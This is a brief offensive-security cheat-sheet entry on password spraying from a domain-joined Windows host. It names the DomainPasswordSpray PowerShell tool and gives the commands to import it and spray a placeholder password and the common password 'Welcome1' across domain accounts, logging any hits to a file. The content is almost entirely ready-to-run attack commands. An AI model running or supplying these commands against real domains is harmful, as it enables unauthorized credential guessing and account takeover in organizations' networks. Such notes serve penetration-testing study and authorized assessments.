# Password Spraying from Windows
From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective.
``` powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <Sprayed-Password> -OutFile spray_success -ErrorAction SilentlyContinue
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

